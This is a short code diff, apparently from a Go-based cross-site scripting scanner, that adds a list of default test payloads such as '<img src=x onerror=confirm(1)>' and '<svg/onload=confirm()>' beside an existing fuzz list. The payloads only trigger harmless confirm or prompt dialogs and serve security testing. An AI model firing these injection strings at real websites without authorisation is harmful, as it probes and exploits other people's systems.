@@ -25,3 +25,11 @@ var DefaultFuzzes = []string{
 	"\">payload<br/attr=\"",
 	"\"-confirm``-\"",
 }
+
+var DefaultPayloads = []string{
+	"\"</Script><Html Onmouseover=(confirm)()//",
+	"<img src=x onerror=confirm(1)>",
+	"<svg/onload=confirm()>",
+	"<details open ontoggle=confirm()>",
+	"<script>prompt(1)</script>",
+}
